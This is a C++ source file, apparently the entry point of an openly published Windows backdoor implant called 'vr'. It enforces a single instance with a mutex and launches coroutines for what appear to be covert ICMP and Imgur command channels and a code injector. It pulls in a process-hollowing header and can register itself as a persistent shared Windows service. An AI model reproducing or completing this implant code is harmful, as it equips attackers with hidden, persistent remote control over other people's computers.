//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include "vr-config.h"
#include "../shared/context.h"
#include "../shared/coroutine.h"
#include "../shared/debug.h"
#include "../shared/win32.h"
#include "../shared/process_hollowing.h"
#include "../shared/math.h"


void icmp_thread(context& ctx);
void imgur_thread(context& ctx);
void injector_thread(context& ctx);

coroutine_loop loop{};

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
    deterministic_uuid_seed = get_machine_hash();

    HANDLE hMutex = mutex_lock(vr_mutant_main);
    if (!hMutex)
        // Already running.
        return 0;

    WSADATA wsa{};
    WSAStartup(0x0202, &wsa);

    context ctx{};
    coroutine_loop::activate(loop);

    coro_start([&ctx]() { icmp_thread(ctx); });
    coro_start([&ctx]() { imgur_thread(ctx); });
    coro_start([&ctx]() { injector_thread(ctx); });

    coro_run();

    WSACleanup();
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    return 0;
}

#if VR_PAYLOAD_SERVICE
BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)
{
    return true;
}

HANDLE main_thread_handle = nullptr;
SERVICE_STATUS_HANDLE svc_status_handle = nullptr;
SERVICE_STATUS svc_status =
{
    SERVICE_WIN32_SHARE_PROCESS,
    SERVICE_START_PENDING,
    SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
};

DWORD WINAPI MainThread(LPVOID)
{
    DWORD result = WinMain(0, 0, nullptr, 0);
    svc_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(svc_status_handle, &svc_status);
    return result;
}

DWORD WINAPI ServiceHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
    switch (dwControl)
    {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        loop.stop_all();
        WaitForSingleObject(main_thread_handle, INFINITE);
        CloseHandle(main_thread_handle);
        main_thread_handle = nullptr;
        svc_status.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_PAUSE:
        svc_status.dwCurrentState = SERVICE_PAUSED;
        SuspendThread(main_thread_handle);
        break;
    case SERVICE_CONTROL_CONTINUE:
        svc_status.dwCurrentState = SERVICE_RUNNING;
        ResumeThread(main_thread_handle);
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    };
    SetServiceStatus(svc_status_handle, &svc_status);
    return NO_ERROR;
}

extern "C" __declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv)
{
    svc_status_handle = RegisterServiceCtrlHandlerExW(L"vr", ServiceHandler, nullptr);
    if (!svc_status_handle)
        return;
    main_thread_handle = CreateThread(nullptr, 0, &MainThread, nullptr, 0, nullptr);
    svc_status.dwCurrentState = main_thread_handle ? SERVICE_RUNNING : SERVICE_STOPPED;
    SetServiceStatus(svc_status_handle, &svc_status);
}
#endif
